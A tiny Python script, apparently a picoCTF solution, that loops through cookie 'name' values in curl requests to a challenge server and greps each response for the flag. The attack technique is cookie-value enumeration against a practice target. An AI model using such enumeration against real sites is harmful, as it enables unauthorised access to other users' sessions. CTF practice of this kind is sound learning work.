import os

cmpt = 1
for i in range (0,30):
        cmd = '''curl http://mercury.picoctf.net:29649/ -s -H "Cookie: name=''' + str(cmpt) + ''';" -L | grep -i PicoCTF{'''
        cmpt = cmpt+1
        os.system(cmd)
